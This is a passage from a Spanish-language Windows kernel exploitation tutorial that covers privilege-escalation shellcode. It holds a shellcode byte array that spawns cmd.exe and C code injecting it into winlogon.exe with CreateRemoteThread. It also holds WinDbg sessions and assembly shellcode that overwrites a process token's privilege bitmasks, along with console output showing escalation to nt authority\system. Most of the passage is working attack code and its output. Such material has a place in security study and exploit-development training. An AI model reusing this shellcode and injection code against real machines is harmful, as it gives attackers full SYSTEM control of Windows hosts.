    0xac</span><span class="p">,</span><span class="mi"> 0x3c</span><span class="p">,</span><span class="mi"> 0x61</span><span class="p">,</span><span class="mi"> 0x7c</span><span class="p">,</span><span class="mi"> 0x02</span><span class="p">,</span><span class="mi"> 0x2c</span><span class="p">,</span><span class="mi"> 0x20</span><span class="p">,</span><span class="mi"> 0x41</span><span class="p">,</span><span class="mi"> 0xc1</span><span class="p">,</span><span class="mi"> 0xc9</span><span class="p">,</span><span class="mi"> 0x0d</span><span class="p">,</span><span class="mi"> 0x41</span><span class="p">,</span><span class="mi">
    0x01</span><span class="p">,</span><span class="mi"> 0xc1</span><span class="p">,</span><span class="mi"> 0xe2</span><span class="p">,</span><span class="mi"> 0xed</span><span class="p">,</span><span class="mi"> 0x52</span><span class="p">,</span><span class="mi"> 0x41</span><span class="p">,</span><span class="mi"> 0x51</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x52</span><span class="p">,</span><span class="mi"> 0x20</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi">
    0x42</span><span class="p">,</span><span class="mi"> 0x3c</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0xd0</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x80</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi">
    0x85</span><span class="p">,</span><span class="mi"> 0xc0</span><span class="p">,</span><span class="mi"> 0x74</span><span class="p">,</span><span class="mi"> 0x67</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0xd0</span><span class="p">,</span><span class="mi"> 0x50</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x18</span><span class="p">,</span><span class="mi"> 0x44</span><span class="p">,</span><span class="mi">
    0x8b</span><span class="p">,</span><span class="mi"> 0x40</span><span class="p">,</span><span class="mi"> 0x20</span><span class="p">,</span><span class="mi"> 0x49</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0xd0</span><span class="p">,</span><span class="mi"> 0xe3</span><span class="p">,</span><span class="mi"> 0x56</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0xff</span><span class="p">,</span><span class="mi"> 0xc9</span><span class="p">,</span><span class="mi"> 0x41</span><span class="p">,</span><span class="mi">
    0x8b</span><span class="p">,</span><span class="mi"> 0x34</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0xd6</span><span class="p">,</span><span class="mi"> 0x4d</span><span class="p">,</span><span class="mi"> 0x31</span><span class="p">,</span><span class="mi"> 0xc9</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x31</span><span class="p">,</span><span class="mi"> 0xc0</span><span class="p">,</span><span class="mi">
    0xac</span><span class="p">,</span><span class="mi"> 0x41</span><span class="p">,</span><span class="mi"> 0xc1</span><span class="p">,</span><span class="mi"> 0xc9</span><span class="p">,</span><span class="mi"> 0x0d</span><span class="p">,</span><span class="mi"> 0x41</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0xc1</span><span class="p">,</span><span class="mi"> 0x38</span><span class="p">,</span><span class="mi"> 0xe0</span><span class="p">,</span><span class="mi"> 0x75</span><span class="p">,</span><span class="mi"> 0xf1</span><span class="p">,</span><span class="mi">
    0x4c</span><span class="p">,</span><span class="mi"> 0x03</span><span class="p">,</span><span class="mi"> 0x4c</span><span class="p">,</span><span class="mi"> 0x24</span><span class="p">,</span><span class="mi"> 0x08</span><span class="p">,</span><span class="mi"> 0x45</span><span class="p">,</span><span class="mi"> 0x39</span><span class="p">,</span><span class="mi"> 0xd1</span><span class="p">,</span><span class="mi"> 0x75</span><span class="p">,</span><span class="mi"> 0xd8</span><span class="p">,</span><span class="mi"> 0x58</span><span class="p">,</span><span class="mi"> 0x44</span><span class="p">,</span><span class="mi">
    0x8b</span><span class="p">,</span><span class="mi"> 0x40</span><span class="p">,</span><span class="mi"> 0x24</span><span class="p">,</span><span class="mi"> 0x49</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0xd0</span><span class="p">,</span><span class="mi"> 0x66</span><span class="p">,</span><span class="mi"> 0x41</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x0c</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x44</span><span class="p">,</span><span class="mi">
    0x8b</span><span class="p">,</span><span class="mi"> 0x40</span><span class="p">,</span><span class="mi"> 0x1c</span><span class="p">,</span><span class="mi"> 0x49</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0xd0</span><span class="p">,</span><span class="mi"> 0x41</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi">
    0xd0</span><span class="p">,</span><span class="mi"> 0x41</span><span class="p">,</span><span class="mi"> 0x58</span><span class="p">,</span><span class="mi"> 0x41</span><span class="p">,</span><span class="mi"> 0x58</span><span class="p">,</span><span class="mi"> 0x5e</span><span class="p">,</span><span class="mi"> 0x59</span><span class="p">,</span><span class="mi"> 0x5a</span><span class="p">,</span><span class="mi"> 0x41</span><span class="p">,</span><span class="mi"> 0x58</span><span class="p">,</span><span class="mi"> 0x41</span><span class="p">,</span><span class="mi"> 0x59</span><span class="p">,</span><span class="mi">
    0x41</span><span class="p">,</span><span class="mi"> 0x5a</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x83</span><span class="p">,</span><span class="mi"> 0xec</span><span class="p">,</span><span class="mi"> 0x20</span><span class="p">,</span><span class="mi"> 0x41</span><span class="p">,</span><span class="mi"> 0x52</span><span class="p">,</span><span class="mi"> 0xff</span><span class="p">,</span><span class="mi"> 0xe0</span><span class="p">,</span><span class="mi"> 0x58</span><span class="p">,</span><span class="mi"> 0x41</span><span class="p">,</span><span class="mi">
    0x59</span><span class="p">,</span><span class="mi"> 0x5a</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x12</span><span class="p">,</span><span class="mi"> 0xe9</span><span class="p">,</span><span class="mi"> 0x57</span><span class="p">,</span><span class="mi"> 0xff</span><span class="p">,</span><span class="mi"> 0xff</span><span class="p">,</span><span class="mi"> 0xff</span><span class="p">,</span><span class="mi"> 0x5d</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi">
    0xba</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8d</span><span class="p">,</span><span class="mi"> 0x8d</span><span class="p">,</span><span class="mi">
    0x01</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x41</span><span class="p">,</span><span class="mi"> 0xba</span><span class="p">,</span><span class="mi"> 0x31</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x6f</span><span class="p">,</span><span class="mi"> 0x87</span><span class="p">,</span><span class="mi"> 0xff</span><span class="p">,</span><span class="mi"> 0xd5</span><span class="p">,</span><span class="mi">
    0xbb</span><span class="p">,</span><span class="mi"> 0xe0</span><span class="p">,</span><span class="mi"> 0x1d</span><span class="p">,</span><span class="mi"> 0x2a</span><span class="p">,</span><span class="mi"> 0x0a</span><span class="p">,</span><span class="mi"> 0x41</span><span class="p">,</span><span class="mi"> 0xba</span><span class="p">,</span><span class="mi"> 0xa6</span><span class="p">,</span><span class="mi"> 0x95</span><span class="p">,</span><span class="mi"> 0xbd</span><span class="p">,</span><span class="mi"> 0x9d</span><span class="p">,</span><span class="mi"> 0xff</span><span class="p">,</span><span class="mi">
    0xd5</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x83</span><span class="p">,</span><span class="mi"> 0xc4</span><span class="p">,</span><span class="mi"> 0x28</span><span class="p">,</span><span class="mi"> 0x3c</span><span class="p">,</span><span class="mi"> 0x06</span><span class="p">,</span><span class="mi"> 0x7c</span><span class="p">,</span><span class="mi"> 0x0a</span><span class="p">,</span><span class="mi"> 0x80</span><span class="p">,</span><span class="mi"> 0xfb</span><span class="p">,</span><span class="mi"> 0xe0</span><span class="p">,</span><span class="mi">
    0x75</span><span class="p">,</span><span class="mi"> 0x05</span><span class="p">,</span><span class="mi"> 0xbb</span><span class="p">,</span><span class="mi"> 0x47</span><span class="p">,</span><span class="mi"> 0x13</span><span class="p">,</span><span class="mi"> 0x72</span><span class="p">,</span><span class="mi"> 0x6f</span><span class="p">,</span><span class="mi"> 0x6a</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x59</span><span class="p">,</span><span class="mi"> 0x41</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi">
    0xda</span><span class="p">,</span><span class="mi"> 0xff</span><span class="p">,</span><span class="mi"> 0xd5</span><span class="p">,</span><span class="mi"> 0x63</span><span class="p">,</span><span class="mi"> 0x6d</span><span class="p">,</span><span class="mi"> 0x64</span><span class="p">,</span><span class="mi"> 0x2e</span><span class="p">,</span><span class="mi"> 0x65</span><span class="p">,</span><span class="mi"> 0x78</span><span class="p">,</span><span class="mi"> 0x65</span><span class="p">,</span><span class="mi"> 0x00
</span><span class="p">};</span>
</code></pre></div></div><br>

<p class="plain-text">El uso es un poco diferente, luego de obtener el pid utilizamos <code class="language-plaintext highlighter-rouge">OpenProcess</code> con derechos <code class="language-plaintext highlighter-rouge">ALL_ACCESS</code>, usando <code class="language-plaintext highlighter-rouge">VirtualAllocEx</code> reservamos un buffer en el proceso para posteriormente utilizando <code class="language-plaintext highlighter-rouge">WriteProcessMemory</code> escribir nuestro shellcode para ejecutar <code class="language-plaintext highlighter-rouge">cmd.exe</code>, finalmente utilizamos <code class="language-plaintext highlighter-rouge">CreateRemoteThread</code> para crear un hilo bajo <code class="language-plaintext highlighter-rouge">winlogon.exe</code> que ejecuta nuestro shellcode, se ejecutará con privilegios elevados.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="na">DWORD</span><span class="p"> pid</span><span class="o"> =</span><span class="p"> FindProcessId(</span><span class="no">L</span><span class="s">"winlogon.exe"</span><span class="p">);
</span><span class="na">HANDLE</span><span class="p"> hProcess</span><span class="o"> =</span><span class="p"> OpenProcess(PROCESS_ALL_ACCESS,</span><span class="mi"> FALSE</span><span class="p">, pid);

LPVOID</span><span class="p"> buffer</span><span class="o"> =</span><span class="p"> VirtualAllocEx(hProcess,</span><span class="mi"> NULL</span><span class="p">,</span><span class="na"> sizeof</span><span class="p">(shellcode), MEM_RESERVE</span><span class="o"> |</span><span class="p"> MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, buffer, shellcode,</span><span class="o"> sizeof</span><span class="p">(shellcode),</span><span class="mi"> NULL</span><span class="p">);

CreateRemoteThread(hProcess, </span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">, (LPTHREAD_START_ROUTINE) buffer, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);  
CloseHandle(hProcess);</span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutarse el shellcode de kernel que edita la <code class="language-plaintext highlighter-rouge">ACL</code> y ejecuta un shellcode bajo el proceso <code class="language-plaintext highlighter-rouge">winlogon.exe</code> se abre una nueva <code class="language-plaintext highlighter-rouge">cmd.exe</code> como <code class="language-plaintext highlighter-rouge">nt authority\system</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user\Desktop></span><span class="am"> whoami</span><span class="p">
windows\user

C:\Users\user\Desktop> </span><span class="am">exploit.exe</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">Microsoft Windows [Versión 10.0.19045.4651]
(c) Microsoft Corporation. Todos los derechos reservados.

C:\Users\user\Desktop></span><span class="am"> whoami</span><span class="p">
nt authority\system

C:\Users\user\Desktop></span>
</code></pre></div></div><br>

</section>

<section class="post" id="edit-privileges">
<br><h3 class="post-title">Edit Privileges</h3><br>

<p class="plain-text">La primitiva del último método es un poco más simple, se basa en cambiar los <code class="language-plaintext highlighter-rouge">privilegios</code> de un proceso, para ello usaremos como proceso una <code class="language-plaintext highlighter-rouge">cmd.exe</code> que por defecto tiene pocos privilegios y de hecho varios de ellos están deshabilitados.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">Microsoft Windows [Versión 10.0.19045.4651]
(c) Microsoft Corporation. Todos los derechos reservados.

C:\Users\user> </span><span class="am">whoami</span><span class="p"> /priv

INFORMACIÓN DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripción                                  Estado
============================= ============================================ =============
SeShutdownPrivilege           Apagar el sistema                            Deshabilitado
SeChangeNotifyPrivilege       Omitir comprobación de recorrido             Habilitada
SeUndockPrivilege             Quitar equipo de la estación de acoplamiento Deshabilitado
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Deshabilitado
SeTimeZonePrivilege           Cambiar la zona horaria                      Deshabilitado

C:\Users\user></span>
</code></pre></div></div><br>

<p class="plain-text">Iniciaremos por obtener el <code class="language-plaintext highlighter-rouge">token</code> del proceso actual, esa estructura se encarga de asignar los privilegios a los usuarios, pero antes de continuar limpiamos el <code class="language-plaintext highlighter-rouge">RefCnt</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">!process 0 0 cmd.exe
PROCESS ffffbe0df99a00c0
    SessionId: 1  Cid: 0348    Peb: ed8cdd8000  ParentCid: 12a0
    DirBase: 194118000  ObjectTable: ffff8102242a1c40  HandleCount:  68.
    Image: cmd.exe

</span><span class="ro">0: kd> </span><span class="p">dt nt!_EPROCESS 0xffffbe0df99a00c0 Token
   +0x4b8 Token : _EX_FAST_REF

</span><span class="ro">0: kd></span><span class="p"> dt nt!_EX_FAST_REF 0xffffbe0df99a00c0 + 0x4b8
   +0x000 Object           : 0xffff8102`21a8a065 Void
   +0x000 RefCnt           : 0y0101
   +0x000 Value            : 0xffff8102`21a8a065

</span><span class="ro">0: kd></span><span class="p"> ? 0xffff810221a8a065 & 0xfffffffffffffff0
Evaluate expression: -139628822093728 = ffff8102`21a8a060</span>
</code></pre></div></div><br>

<p class="plain-text">Dentro de la estrucutra <code class="language-plaintext highlighter-rouge">_TOKEN</code> encontramos que en un offset de <code class="language-plaintext highlighter-rouge">0x40</code> a partir del token podemos ver un atributo llamado <code class="language-plaintext highlighter-rouge">Privileges</code> que es el que nos interesa.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> dt nt!_TOKEN 0xffff810221a8a060
   +0x000 TokenSource      : _TOKEN_SOURCE
   +0x010 TokenId          : _LUID
   +0x018 AuthenticationId : _LUID
   +0x020 ParentTokenId    : _LUID
   +0x028 ExpirationTime   : _LARGE_INTEGER 0x7fffffff`ffffffff
   +0x030 TokenLock        : 0xffffbe0d`f9a9cc10 _ERESOURCE
   +0x038 ModifiedId       : _LUID
   +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES
   +0x058 AuditPolicy      : _SEP_AUDIT_POLICY
   +0x078 SessionId        : 1</span>
</code></pre></div></div><br>

<p class="plain-text">El atributo es una estructura de tipo <code class="language-plaintext highlighter-rouge">_SEP_TOKEN_PRIVILEGES</code> y se compone de otros <code class="language-plaintext highlighter-rouge">3</code> atributos, cada uno de <code class="language-plaintext highlighter-rouge">8</code> bytes, el qword de <code class="language-plaintext highlighter-rouge">Present</code> define los privilegios que estarán asignados al proceso mientras <code class="language-plaintext highlighter-rouge">Enabled</code> define cuales estarán habilitados.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> dt nt!_SEP_TOKEN_PRIVILEGES 0xffff810221a8a060 + 0x40
   +0x000 Present          : 0x00000006`02880000
   +0x008 Enabled          : 0x800000
   +0x010 EnabledByDefault : 0x40800000</span>
</code></pre></div></div><br>

<p class="plain-text">Según la <a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants">documentación</a> si sumamos todas las constantes de privilegios nos deja un valor de <code class="language-plaintext highlighter-rouge">0x1ff2ffffbc</code>, el concepto es simple, solo tenemos que escribir ese <code class="language-plaintext highlighter-rouge">qword</code> en los atributos <code class="language-plaintext highlighter-rouge">Present</code> y <code class="language-plaintext highlighter-rouge">Enabled</code> en los offset <code class="language-plaintext highlighter-rouge">0x40</code> y <code class="language-plaintext highlighter-rouge">0x48</code> respectivamente, al hacerlo todos los privilegios en el proceso deberían estar asignados y habilitados.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">eq 0xffff810221a8a060 + 0x40 0x1ff2ffffbc

</span><span class="ro">0: kd></span><span class="p"> eq 0xffff810221a8a060 + 0x48 0x1ff2ffffbc

</span><span class="ro">0: kd></span><span class="p"> dt nt!_SEP_TOKEN_PRIVILEGES 0xffff810221a8a060 + 0x40
   +0x000 Present          : 0x0000001f`f2ffffbc
   +0x008 Enabled          : 0x0000001f`f2ffffbc
   +0x010 EnabledByDefault : 0x40800000</span>
</code></pre></div></div><br>

<p class="plain-text">Si volvemos al proceso <code class="language-plaintext highlighter-rouge">cmd.exe</code> encontramos que se han habilitado todos los privilegios para el proceso actual, solo nos queda pasarlo a un <code class="language-plaintext highlighter-rouge">shellcode</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user> </span><span class="am">whoami</span><span class="p"> /priv

INFORMACIÓN DE PRIVILEGIOS
--------------------------

Nombre de privilegio                      Descripción                                                                   Estado
========================================= ============================================================================= ==========
SeCreateTokenPrivilege                    Crear un objeto símbolo (token)                                               Habilitada
SeAssignPrimaryTokenPrivilege             Reemplazar un símbolo (token) de nivel de proceso                             Habilitada
SeLockMemoryPrivilege                     Bloquear páginas en la memoria                                                Habilitada
SeIncreaseQuotaPrivilege                  Ajustar las cuotas de la memoria para un proceso                              Habilitada
SeTcbPrivilege                            Actuar como parte del sistema operativo                                       Habilitada
SeSecurityPrivilege                       Administrar registro de seguridad y auditoría                                 Habilitada
SeTakeOwnershipPrivilege                  Tomar posesión de archivos y otros objetos                                    Habilitada
SeLoadDriverPrivilege                     Cargar y descargar controladores de dispositivo                               Habilitada
SeSystemProfilePrivilege                  Generar perfiles del rendimiento del sistema                                  Habilitada
SeSystemtimePrivilege                     Cambiar la hora del sistema                                                   Habilitada
SeProfileSingleProcessPrivilege           Generar perfiles de un solo proceso                                           Habilitada
SeIncreaseBasePriorityPrivilege           Aumentar prioridad de programación                                            Habilitada
SeCreatePagefilePrivilege                 Crear un archivo de paginación                                                Habilitada
SeCreatePermanentPrivilege                Crear objetos compartidos permanentes                                         Habilitada
SeBackupPrivilege                         Hacer copias de seguridad de archivos y directorios                           Habilitada
SeRestorePrivilege                        Restaurar archivos y directorios                                              Habilitada
SeShutdownPrivilege                       Apagar el sistema                                                             Habilitada
SeDebugPrivilege                          Depurar programas                                                             Habilitada
SeAuditPrivilege                          Generar auditorías de seguridad                                               Habilitada
SeSystemEnvironmentPrivilege              Modificar valores de entorno firmware                                         Habilitada
SeChangeNotifyPrivilege                   Omitir comprobación de recorrido                                              Habilitada
SeUndockPrivilege                         Quitar equipo de la estación de acoplamiento                                  Habilitada
SeManageVolumePrivilege                   Realizar tareas de mantenimiento del volumen                                  Habilitada
SeImpersonatePrivilege                    Suplantar a un cliente tras la autenticación                                  Habilitada
SeCreateGlobalPrivilege                   Crear objetos globales                                                        Habilitada
SeTrustedCredManAccessPrivilege           Obtener acceso al administrador de credenciales como un llamador de confianza Habilitada
SeRelabelPrivilege                        Modificar la etiqueta de un objeto                                            Habilitada
SeIncreaseWorkingSetPrivilege             Aumentar el espacio de trabajo de un proceso                                  Habilitada
SeTimeZonePrivilege                       Cambiar la zona horaria                                                       Habilitada
SeCreateSymbolicLinkPrivilege             Crear vínculos simbólicos                                                     Habilitada
SeDelegateSessionUserImpersonatePrivilege Obtén un token de suplantación para otro usuario en la misma sesión           Habilitada

C:\Users\user></span>
</code></pre></div></div><br>

<p class="plain-text">De nuevo iniciamos el shellcode con las instrucciones de <code class="language-plaintext highlighter-rouge">PsGetCurrentProcess</code> que servirán para obtener la dirección del proceso actual que guardaremos en <code class="language-plaintext highlighter-rouge">rbx</code>,  movemos a <code class="language-plaintext highlighter-rouge">rcx</code>+ el campo <code class="language-plaintext highlighter-rouge">Token</code> del proceso actual y limpiamos el <code class="language-plaintext highlighter-rouge">RefCnt</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">global</span><span class="na"> _start

_start</span><span class="p">:
    </span><span class="o">mov</span><span class="mi"> rdx</span><span class="p">, [</span><span class="mi">gs</span><span class="p">:</span><span class="mi">0x188</span><span class="p">]    </span><span class="c1">; $rdx = _KTHREAD
    </span><span class="o">mov</span><span class="mi"> rax</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0xb8</span><span class="p">]  </span><span class="c1">; $rax = _EPROCESS
    </span><span class="o">mov</span><span class="mi"> rcx</span><span class="p">, [</span><span class="mi">rax</span><span class="o"> +</span><span class="mi"> 0x4b8</span><span class="p">]</span><span class="c1"> ; $rcx = process token
    </span><span class="o">and</span><span class="mi"> cl</span><span class="p">,</span><span class="mi"> 0xf0</span><span class="c1">           ; clear _EX_FAST_REF struct</span>
</code></pre></div></div><br>

<p class="plain-text">Finalmente movemos a <code class="language-plaintext highlighter-rouge">rbx</code> la constante que pertenece a <code class="language-plaintext highlighter-rouge">All Privileges</code> y lo sobrescribimos en los valores de <code class="language-plaintext highlighter-rouge">Present</code> y <code class="language-plaintext highlighter-rouge">Enabled</code> del proceso actual.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    mov</span><span class="mi"> rbx</span><span class="p">,</span><span class="mi"> 0x1ff2ffffbc</span><span class="c1">  ; $rbx = all privileges
    </span><span class="o">mov</span><span class="p"> [</span><span class="mi">rcx</span><span class="o"> +</span><span class="mi"> 0x40</span><span class="p">],</span><span class="mi"> rbx</span><span class="c1">  ; change present privileges
    </span><span class="o">mov</span><span class="p"> [</span><span class="mi">rcx</span><span class="o"> +</span><span class="mi"> 0x48</span><span class="p">],</span><span class="mi"> rbx</span><span class="c1">  ; change enabled privileges</span>
</code></pre></div></div><br>

<p class="plain-text">Nuestro shellcode final es más pequeño que los otros 2 métodos, resumiendo su funcionamiento sobrescribe los valores que pertenecen a los <code class="language-plaintext highlighter-rouge">privilegios</code> del proceso por una constante que asigne y habilite todos, al final simplemente retorna.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">global</span><span class="na"> _start

_start</span><span class="p">:
    </span><span class="o">mov</span><span class="mi"> rdx</span><span class="p">, [</span><span class="mi">gs</span><span class="p">:</span><span class="mi">0x188</span><span class="p">]</span><span class="c1">    ; $rdx = _KTHREAD
    </span><span class="o">mov</span><span class="mi"> rax</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0xb8</span><span class="p">]</span><span class="c1">  ; $rax = _EPROCESS

    </span><span class="o">mov</span><span class="mi"> rcx</span><span class="p">, [</span><span class="mi">rax</span><span class="o"> +</span><span class="mi"> 0x4b8</span><span class="p">]</span><span class="c1"> ; $rcx = process token
    </span><span class="o">and</span><span class="mi"> cl</span><span class="p">,</span><span class="mi"> 0xf0</span><span class="c1">           ; clear _EX_FAST_REF struct

    </span><span class="o">mov</span><span class="mi"> rbx</span><span class="p">,</span><span class="mi"> 0x1ff2ffffbc</span><span class="c1">  ; $rbx = all privileges
    </span><span class="o">mov</span><span class="p"> [</span><span class="mi">rcx</span><span class="o"> +</span><span class="mi"> 0x40</span><span class="p">],</span><span class="mi"> rbx</span><span class="c1">  ; change present privileges
    </span><span class="o">mov</span><span class="p"> [</span><span class="mi">rcx</span><span class="o"> +</span><span class="mi"> 0x48</span><span class="p">],</span><span class="mi"> rbx</span><span class="c1">  ; change enabled privileges

    </span><span class="o">ret</span><span class="c1">                    ; return</span>
</code></pre></div></div><br>

<p class="plain-text">Aunque si lanzamos una <code class="language-plaintext highlighter-rouge">cmd.exe</code> ya tenemos todos los privilegios lo ideal sería conseguir <code class="language-plaintext highlighter-rouge">nt authority\system</code>, luego de obtener el pid utilizamos <code class="language-plaintext highlighter-rouge">OpenProcess</code> con derechos <code class="language-plaintext highlighter-rouge">ALL_ACCESS</code>, usando <code class="language-plaintext highlighter-rouge">VirtualAllocEx</code> reservamos un buffer en el proceso para posteriormente utilizando <code class="language-plaintext highlighter-rouge">WriteProcessMemory</code> escribir nuestro shellcode para ejecutar <code class="language-plaintext highlighter-rouge">cmd.exe</code>, finalmente utilizamos <code class="language-plaintext highlighter-rouge">CreateRemoteThread</code> para crear un hilo bajo <code class="language-plaintext highlighter-rouge">winlogon.exe</code> que ejecuta nuestro shellcode, se ejecutará con privilegios elevados.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="na">DWORD</span><span class="p"> pid</span><span class="o"> =</span><span class="p"> FindProcessId(</span><span class="no">L</span><span class="s">"winlogon.exe"</span><span class="p">);
</span><span class="na">HANDLE</span><span class="p"> hProcess</span><span class="o"> =</span><span class="p"> OpenProcess(PROCESS_ALL_ACCESS,</span><span class="mi"> FALSE</span><span class="p">, pid);

LPVOID</span><span class="p"> buffer</span><span class="o"> =</span><span class="p"> VirtualAllocEx(hProcess,</span><span class="mi"> NULL</span><span class="p">,</span><span class="na"> sizeof</span><span class="p">(shellcode), MEM_RESERVE</span><span class="o"> |</span><span class="p"> MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, buffer, shellcode,</span><span class="o"> sizeof</span><span class="p">(shellcode),</span><span class="mi"> NULL</span><span class="p">);

CreateRemoteThread(hProcess, </span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">, (LPTHREAD_START_ROUTINE) buffer, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);  
CloseHandle(hProcess);</span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutarse el shellcode que modifica los <code class="language-plaintext highlighter-rouge">privilegios</code> y ejecuta un shellcode bajo el proceso <code class="language-plaintext highlighter-rouge">winlogon.exe</code> se abre una nueva <code class="language-plaintext highlighter-rouge">cmd.exe</code> como <code class="language-plaintext highlighter-rouge">nt authority\system</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user\Desktop></span><span class="am"> whoami</span><span class="p">
windows\user

C:\Users\user\Desktop> </span><span class="am">exploit.exe</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">Microsoft Windows [Versión 10.0.19045.4651]
(c) Microsoft Corporation. Todos los derechos reservados.

C:\Users\user\Desktop></span><span class="am"> whoami</span><span class="p">
nt authority\system

C:\Users\user\Desktop></span>
</code></pre></div></div><br>

</section>

<section class="post" id="return">
<br><h3 class="post-title">Sysret Return</h3><br>

<p class="plain-text">Hay que tener en cuenta que para todos los shellcodes anteriores se necesita restaurar la pila dependiendo el exploit, de lo contrario se provocará un <code class="language-plaintext highlighter-rouge">BSOD</code>, la primera opción es restaurar la pila a un punto en donde al retornar no bloquee o buscamos una forma que evite este problema de forma mucho mas general.</p>

<p class="plain-text">Podemos restaurar la pila ejecutando <code class="language-plaintext highlighter-rouge">add esp, [offset]</code>, o simplemente volver al modo de usuario, sin embargo necesitamos restaurar el contexto del estado de la <code class="language-plaintext highlighter-rouge">CPU</code> a como estaba antes de cambiar a modo kernel, para nuesta suerte esto se guarda en el <code class="language-plaintext highlighter-rouge">TrapFrame</code> que es un valor de la estructura <code class="language-plaintext highlighter-rouge">KTRHEAD</code> en el offset <code class="language-plaintext highlighter-rouge">0x90</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
